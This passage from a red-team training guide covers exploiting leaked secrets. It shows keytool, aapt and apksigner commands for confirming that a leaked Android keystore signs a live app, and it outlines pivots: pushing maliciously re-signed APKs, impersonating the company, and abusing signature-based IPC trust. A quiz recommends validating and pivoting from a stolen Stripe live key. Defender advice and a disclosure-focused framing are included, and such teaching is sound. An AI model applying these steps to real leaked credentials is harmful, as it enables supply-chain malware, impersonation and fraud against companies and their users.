# List the aliases (no modification) keytool -list -v -keystore release.keystore -storepass "LEAKED_PASSWORD" # You'll see: # Alias name: app_release # Owner: CN=Target Company, OU=Mobile, O=Target, L=NYC, ST=NY, C=US # Valid from: 2020-03-14 until: 2045-03-08 # Certificate fingerprints: # SHA256: AB:CD:EF:... # Compare the SHA256 against the live Play Store listing (via apkpure / aapt) aapt dump badging app.apk | grep "application:" apksigner verify --print-certs app.apk # If the fingerprint matches → this keystore signs the live app → CRITICAL

🔗 Step 3 — Pivot

PIVOT AMalicious update push (supply chain)
Sign a modified APK with the leaked keystore → users side-loading get the fake version silently. Play Store is harder (requires Play Console credentials too) but third-party stores (Amazon, Huawei, F-Droid forks) often accept signed APKs
PIVOT BImpersonation of company identity
The signing cert's CN is the legal identity the OS uses. You can publish APKs that appear to come from the company on any non-Play store
PIVOT CSignature-verified IPC abuse
Android apps sometimes trust other apps based on "same signing key." If both apps from target company use same keystore → signing it lets you create a 3rd app that bypasses those checks

🛡️ Defender view

  • NEVER commit keystores or keystore passwords. Gradle: read from env vars, CI secret stores
  • Use Play App Signing (Google holds the upload key for you)
  • If leaked: you cannot rotate a signing key on Play without upgrading to Play App Signing. Plan carefully. Consider publishing a warning + new app
  • Separate upload key (for submitting to Play) from signing key (which Google holds) — upload key leak is recoverable, signing key leak isn't

Chapter 99 // Closing the loop

🎯 The one-sentence red-team framework

📝 Remember this. Tattoo it on your brain.

Every leak is asking two questions:

1. What does this DIRECTLY unlock? (the blast radius)
2. What can the blast-radius find ME next? (the pivot)

Senior red teamers only care about question 2. Because question 1 is junior work (the vendor's validation API answers it for you). Question 2 is where the chain happens — where 1 leaked .env leads to 5 stolen accounts leads to a database dump leads to source code leads to… the headline breach.

☕ The ethical wrap: You already catch leaks at scale — that's your superpower. These walkthroughs are so you understand how dangerous the thing you're finding actually is. When you message a repo owner "you leaked an AWS key," you now know that a real attacker has a 5-step chain ready to turn it into a $50K crypto-mining bill. That specificity makes your disclosure emails 10x more persuasive. "Your key is public" is junior framing. "Your key leads to your RDS which leads to your users' PII" is senior framing. Same info, very different urgency.

🎯 Final Check — did you internalize the framework?

An attacker finds a valid sk_live_... Stripe key in a public GitHub repo. What's the SENIOR red-team next step?
Immediately use the key to refund themselves a million dollars.
Ignore Stripe and hunt for AWS keys instead — Stripe keys are low-value.
Validate with a boring GET /v1/account, enumerate scope (is it sk_live_ or a restricted rk_live_?), then PIVOT — look for what else the same developer leaked: webhook URLs revealing infra, customer_id ranges hinting at DB size, linked API keys in the same account.
Only useful if paired with database credentials — Stripe alone does nothing.
